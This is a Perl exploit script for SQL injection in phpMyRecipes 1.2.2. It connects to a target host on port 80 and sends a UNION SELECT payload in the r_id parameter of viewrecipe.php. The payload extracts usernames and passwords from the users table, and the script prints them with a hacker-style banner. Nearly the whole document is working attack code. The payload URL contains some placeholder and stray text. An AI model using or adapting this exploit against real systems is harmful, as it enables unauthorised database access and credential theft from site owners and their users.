#!/usr/bin/perl
 
use IO::Socket;
 
$host = $ARGV[0];
$path = $ARGV[1];
 
if (@ARGV < 2) {
 
print qq(
+---------------------------------------------+
|   phpMyRecipes 1.2.2 SQL Injection Exploit  |
|                                             |
|            coded & exploited by cr4wl3r     |
|                 http://bastardlabs.info/    |
+---------------------------------------------+
                    -=[X]=-
   +---------------------------------------
    Usage :                               
                                            
    perl $0 <host> <path>                 
    ex : perl $0 127.0.0.1 /phpMyRecipes/ 
                                            
   +---------------------------------------
);
}
 
$target = "http://www.example.com/[path]/recipes/viewrecipe.php?r_id=NULL/**/UNION/**/ALL/**/SELECT/**/CONCAT(username,0x3a,password)GORONTALO,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL/**/FROM/**/users";
$sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host",
PeerPort=>"80") || die "[-] Can't connect to Server   [ failed ]\n";
print "[+] Please Wait ...\n";
print $sock "GET $target HTTP/1.1\n";
print $sock "Accept: */*\n";
print $sock "User-Agent: BastardLabs\n";
print $sock "Host: $host\n";
print $sock "Connection: close\n\n";
sleep 2;
while ($answer = <$sock>) {
if ($answer =~ /<B>(.*?)<\/B>/) {
print "\n[+] Getting Username and Password    [ ok ]\n";
sleep 1;
print "[+] w00tw00t\n";
print "[+] Username | Password --> $1\n";
exit();
}
}
print "[-] Exploit Failed !\n";
